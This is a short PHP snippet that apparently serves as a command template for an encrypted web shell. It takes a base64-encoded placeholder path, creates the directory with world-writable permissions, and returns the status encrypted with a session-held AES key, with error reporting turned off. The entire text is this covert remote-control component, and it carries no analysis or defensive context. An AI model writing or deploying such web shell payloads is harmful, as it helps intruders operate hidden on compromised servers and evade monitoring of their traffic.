
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$path = base64_decode('__PATH__');
$data = array(
    "path" => $path,
    "status" => mkdir($path, 0777, true)
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
